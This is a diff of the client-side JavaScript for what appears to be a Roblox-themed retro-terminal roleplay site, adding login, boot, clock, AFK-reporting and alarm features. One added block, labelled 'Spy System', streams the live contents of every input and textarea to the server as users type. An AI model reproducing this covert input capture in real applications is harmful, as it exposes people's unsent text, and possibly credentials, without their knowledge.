@@ -1,133 +1,172 @@
+import { UI, switchScreen, switchView, initDraggables } from './modules/ui.js';
+import { handleLogin } from './modules/auth.js';
 import { initAudio, playSound } from './modules/audio.js';
+import { initNotepad } from './modules/notepad.js';
+import { initHelp } from './modules/help.js';
+import { initFiles } from './modules/files.js';
+import { initComms } from './modules/comms.js';
 import { initProtocols } from './modules/protocols.js';
 
-let socket;
+// Tenta carregar o script.js dinamicamente para restaurar funcionalidades extras
+const scriptExtras = document.createElement('script');
+scriptExtras.src = '../script.js'; // Caminho relativo saindo de js/ para raiz
+document.body.appendChild(scriptExtras);
 
-try {
-    if (typeof io !== 'undefined') {
-        socket = io();
-    } else {
-        throw new Error('Socket missing');
-    }
-} catch (e) {
-    socket = { on: () => {}, emit: () => {} };
-}
+const socket = io();
+let currentUser = null;
+let idleTimer;
+let currentView = 'IDLE';
+const IDLE_LIMIT = 60000;
 
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener("DOMContentLoaded", () => {
     initAudio();
+    initNotepad(socket);
+    initHelp(socket);
+    initFiles(socket);
     initProtocols(socket);
-    startBootSequence();
-    updateClock();
-    setInterval(updateClock, 1000);
+    initDraggables();
 
-    const loginBtn = document.getElementById('btnLogin');
-    const loginInput = document.getElementById('inpId');
+    // Relógio e Data
+    setInterval(() => {
+        const now = new Date();
+        const clockEl = document.getElementById('clock');
+        const dateEl = document.getElementById('dateDisplay');
+        
+        if(clockEl) clockEl.textContent = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+        
+        if(dateEl) {
+            const year = now.getFullYear() + 16;
+            dateEl.textContent = `${year}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}`;
+        }
+    }, 1000);
 
-    if (loginBtn) loginBtn.addEventListener('click', handleLogin);
-    if (loginInput) {
-        loginInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') handleLogin();
+    // Boot Sequence
+    const bootScreen = document.getElementById('boot-sequence');
+    if (bootScreen && !bootScreen.classList.contains('hidden')) {
+        playSound('boot');
+        setTimeout(() => {
+            bootScreen.classList.add('hidden');
+            bootScreen.style.display = 'none';
+            switchScreen('login');
+        }, 6000);
+    }
+
+    // Configuração de Login
+    const btnLogin = document.getElementById('btnLogin');
+    const inpId = document.getElementById('inpId');
+
+    if (btnLogin) {
+        btnLogin.onclick = async () => {
+            currentUser = await handleLogin(socket);
+            if(currentUser) initComms(socket, currentUser);
+        };
+    }
+    
+    if (inpId) {
+        inpId.addEventListener("keydown", async e => { 
+            if (e.key === "Enter") {
+                currentUser = await handleLogin(socket);
+                if(currentUser) initComms(socket, currentUser);
+            }
         });
     }
-});
 
-function switchScreen(screenName) {
-    const screens = {
-        boot: document.getElementById('boot-sequence'),
-        login: document.getElementById('login-screen'),
-        desktop: document.getElementById('desktop-screen')
-    };
+    // Dashboard
+    const btnDash = document.getElementById('btnMyDashboard');
+    if (btnDash) {
+        btnDash.onclick = () => {
+            switchView('dashboard');
+            currentView = 'DASHBOARD';
+            playSound('click');
+            reportActivity();
+        };
+    }
 
-    Object.values(screens).forEach(screen => {
-        if (screen) {
-            screen.classList.remove('active');
-            screen.classList.add('hidden');
-            screen.style.display = 'none';
+    // Monitoramento de Input (Spy System)
+    document.addEventListener('input', (e) => {
+        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+            socket.emit('live_input', {
+                fieldId: e.target.id || 'unknown',
+                value: e.target.value
+            });
         }
     });
 
-    if (screens[screenName]) {
-        screens[screenName].classList.remove('hidden');
-        screens[screenName].classList.add('active');
-        screens[screenName].style.display = 'flex';
-    }
-}
+    // Sistema de AFK
+    document.addEventListener('mousemove', resetIdleTimer);
+    document.addEventListener('keydown', resetIdleTimer);
 
-function startBootSequence() {
-    const progressFill = document.getElementById('progress-fill');
-    let progress = 0;
-
-    const interval = setInterval(() => {
-        progress += 2;
-        if (progressFill) progressFill.style.width = progress + '%';
-
-        if (progress >= 100) {
-            clearInterval(interval);
-            setTimeout(() => {
-                switchScreen('login');
-                playSound('boot');
-            }, 500);
-        }
-    }, 50);
-}
-
-async function handleLogin() {
-    const input = document.getElementById('inpId');
-    const status = document.getElementById('loginStatus');
-    const userId = input.value.trim();
-
-    if (!userId) {
-        status.textContent = 'ID REQUIRED';
-        return;
+    function resetIdleTimer() {
+        if (!currentUser) return;
+        clearTimeout(idleTimer);
+        reportActivity(false);
+        idleTimer = setTimeout(() => {
+            reportActivity(true);
+        }, IDLE_LIMIT);
     }
 
-    status.textContent = 'AUTHENTICATING...';
-    playSound('click');
+    function reportActivity(isAfk = false) {
+        if (!currentUser) return;
+        const openWindows = [];
+        document.querySelectorAll('.window-newton').forEach(win => {
+            if (!win.classList.contains('hidden')) {
+                openWindows.push({ id: win.id, hidden: false });
+            }
+        });
+        socket.emit('update_activity', { 
+            view: isAfk ? 'AFK' : currentView, 
+            afk: isAfk,
+            fullState: { view: currentView, afk: isAfk, windows: openWindows }
+        });
+    }
 
-    try {
-        const response = await fetch(`/api/roblox/${userId}`);
+    socket.on('force_state_report', () => {
+        reportActivity();
+    });
+
+    // Atualização de Status na Topbar
+    socket.on('status_update', (status) => {
+        const statusText = document.getElementById('statusText');
+        const indicator = document.getElementById('statusIndicator');
         
-        if (!response.ok) throw new Error('User not found');
-        const data = await response.json();
-
-        const sessionInfo = document.getElementById('sessionInfo');
-        if (sessionInfo) {
-            sessionInfo.innerHTML = `
-                <div class="session-line">STATUS: <span class="session-value">ACTIVE</span></div>
-                <div class="session-line">USER: <span class="session-value">${data.name}</span></div>
-                <div class="session-line">ID: <span class="session-value">${data.id}</span></div>
-            `;
+        if(statusText) statusText.textContent = status;
+        if(indicator) {
+            if (status === 'ONLINE') {
+                indicator.style.backgroundColor = '#4ade80';
+                indicator.style.boxShadow = '0 0 5px #4ade80';
+            } else {
+                indicator.style.backgroundColor = '#9ca3af';
+                indicator.style.boxShadow = 'none';
+            }
         }
+    });
 
-        status.textContent = 'ACCESS GRANTED';
-        playSound('notify');
+    // Sistema de Alarmes
+    socket.on('alarm_update', (alarmType) => {
+        document.body.className = ''; // Reseta classes
+        const banner = document.getElementById('alarm-banner');
+        const text = document.getElementById('alarm-type-text');
+        const powerOff = document.getElementById('power-off-overlay');
+        const btnReboot = document.getElementById('btnSystemReboot');
         
-        socket.emit('login', { userId: data.id, username: data.name });
+        // Esconde tudo inicialmente
+        if(powerOff) powerOff.classList.add('hidden');
+        if(banner) banner.classList.add('hidden');
 
-        setTimeout(() => {
-            switchScreen('desktop');
-        }, 1000);
-
-    } catch (error) {
-        status.textContent = 'ACCESS DENIED';
-        playSound('denied');
-    }
-}
-
-function updateClock() {
-    const clock = document.getElementById('clock');
-    const dateDisplay = document.getElementById('dateDisplay');
-    const now = new Date();
-    
-    if (clock) {
-        const hours = String(now.getHours()).padStart(2, '0');
-        const minutes = String(now.getMinutes()).padStart(2, '0');
-        clock.textContent = `${hours}:${minutes}`;
-    }
-    
-    if (dateDisplay) {
-        const futureDate = new Date(now);
-        futureDate.setFullYear(now.getFullYear() + 16);
-        dateDisplay.textContent = futureDate.toISOString().split('T')[0];
-    }
-}
+        if (alarmType === 'off') {
+            if(powerOff) powerOff.classList.remove('hidden');
+            if (currentUser && currentUser.isObunto && btnReboot) {
+                btnReboot.classList.remove('hidden');
+            } else if (btnReboot) {
+                btnReboot.classList.add('hidden');
+            }
+        } else if (alarmType === 'on') {
+            document.body.style.opacity = '0';
+            setTimeout(() => { document.body.style.opacity = '1'; playSound('boot'); }, 1000);
+        } else if (alarmType !== 'green' && alarmType !== 'normal') {
+            document.body.classList.add(`alarm-${alarmType}`);
+            if(banner) banner.classList.remove('hidden');
+            if(text) text.textContent = `${alarmType.toUpperCase()} ALERT`;
+        }
+    });
+});
